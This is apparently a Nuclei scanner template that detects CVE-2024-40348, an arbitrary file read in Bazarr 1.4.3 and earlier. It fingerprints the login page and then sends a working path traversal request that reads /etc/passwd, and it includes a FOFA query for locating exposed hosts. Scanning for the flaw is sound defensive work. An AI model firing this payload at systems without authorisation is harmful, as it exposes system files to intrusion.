id: CVE-2024-40348

info:
  name: Bazarr < 1.4.3 - Arbitrary File Read
  author: s4e-io
  severity: high
  description: |
    Bazarr 1.4.3 and earlier versions have a arbitrary file read vulnerability.
  reference:
    - https://github.com/4rdr/proofs/blob/main/info/Bazaar_1.4.3_File_Traversal_via_Filename.md
    - https://www.bazarr.media/
    - https://github.com/bigb0x/CVE-2024-40348
  classification:
    epss-score: 0.91593
    epss-percentile: 0.99653
  metadata:
    verified: true
    max-request: 2
    vendor: morpheus65535
    product: bazarr
    fofa-query: title=="Bazarr" && icon_hash="-1983413099"
  tags: cve,cve2024,bazarr,lfi,vuln

flow: http(1) && http(2)

http:
  - method: GET
    path:
      - "{{BaseURL}}/login"

    matchers:
      - type: word
        part: body
        words:
          - "<title>Bazarr</title>"
          - 'content="Bazarr'
          - "window.Bazarr"
        condition: or
        internal: true

  - method: GET
    path:
      - "{{BaseURL}}/api/swaggerui/static/../../../../../../../../../../../../../../../../etc/passwd"

    matchers-condition: and
    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"

      - type: word
        part: header
        words:
          - "application/octet-stream"

      - type: status
        status:
          - 200
# digest: 4a0a0047304502210081a918b1eb3630fff2bcd9e66ec36d84bbe5d3cdebdd97c32f886d413d9fa65302203193a8643da7d96b26462cde0df2c29a6ff8d4ae26d2446a0c97486d2c4aab85:922c64590222798bb761d5b6d8e72950